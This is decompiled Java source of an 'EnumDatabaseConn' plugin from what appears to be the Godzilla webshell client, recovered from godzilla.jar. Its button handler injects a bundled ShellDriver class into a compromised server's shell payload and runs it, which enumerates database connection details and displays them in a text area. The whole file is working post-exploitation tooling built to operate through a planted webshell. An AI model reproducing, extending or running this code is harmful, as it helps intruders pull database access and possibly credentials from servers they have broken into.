/*     */ package shells.plugins.java;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PluginAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.imp.Plugin;
/*     */ import core.shell.ShellEntity;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.io.InputStream;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import javax.swing.JTextArea;
/*     */ import util.Log;
/*     */ import util.automaticBindClick;
/*     */ import util.functions;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */ @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "EnumDatabaseConn", DisplayName = "枚举数据库信息")
/*     */ public class EnumDatabaseConn
/*     */   implements Plugin
/*     */ {
/*     */   private static final String CLASS_NAME = "plugin.ShellDriver";
/*     */   private final JPanel panel;
/*     */   private final JButton enumDatabaseConnButton;
/*     */   private boolean loadState;
/*     */   private ShellEntity shell;
/*     */   private Payload payload;
/*     */   private Encoding encoding;
/*     */   private final JSplitPane splitPane;
/*     */   private final JTextArea resultTextArea;
/*     */   
/*     */   public EnumDatabaseConn() {
/*  40 */     this.panel = new JPanel(new BorderLayout());
/*  41 */     this.enumDatabaseConnButton = new JButton("EnumDatabaseConn");
/*     */     
/*  43 */     this.resultTextArea = new JTextArea();
/*  44 */     this.splitPane = new JSplitPane();
/*     */     
/*  46 */     this.splitPane.setOrientation(0);
/*  47 */     this.splitPane.setDividerSize(0);
/*     */     
/*  49 */     JPanel topPanel = new JPanel();
/*     */     
/*  51 */     topPanel.add(this.enumDatabaseConnButton);
/*     */     
/*  53 */     this.splitPane.setTopComponent(topPanel);
/*  54 */     this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
/*  55 */     this.panel.add(this.splitPane);
/*     */     
/*  57 */     automaticBindClick.bindJButtonClick(this, this);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public JPanel getView() {
/*  63 */     return this.panel;
/*     */   }
/*     */   
/*     */   private void load() {
/*  67 */     if (!this.loadState) {
/*     */       try {
/*  69 */         InputStream inputStream = getClass().getResourceAsStream("assets/ShellDriver.classs");
/*  70 */         byte[] data = functions.readInputStream(inputStream);
/*  71 */         inputStream.close();
/*  72 */         if (this.payload.include("plugin.ShellDriver", data)) {
/*  73 */           this.loadState = true;
/*  74 */           Log.log("Load success", new Object[0]);
/*     */         } else {
/*  76 */           Log.log("Load fail", new Object[0]);
/*     */         } 
/*  78 */       } catch (Exception e) {
/*  79 */         Log.error(e);
/*     */       } 
/*     */     }
/*     */   }
/*     */ 
/*     */   
/*     */   private void enumDatabaseConnButtonClick(ActionEvent actionEvent) {
/*  86 */     if (!this.loadState) {
/*  87 */       load();
/*     */     }
/*  89 */     if (this.loadState) {
/*  90 */       byte[] result = this.payload.evalFunc("plugin.ShellDriver", "run", new ReqParameter());
/*  91 */       String resultString = this.encoding.Decoding(result);
/*  92 */       this.resultTextArea.setText(resultString);
/*     */     } else {
/*  94 */       Log.error("load EnumDatabaseConn Fail!");
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public void init(ShellEntity arg0) {
/* 101 */     this.shell = arg0;
/* 102 */     this.payload = arg0.getPayloadModule();
/* 103 */     this.encoding = Encoding.getEncoding(arg0);
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\java\EnumDatabaseConn.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */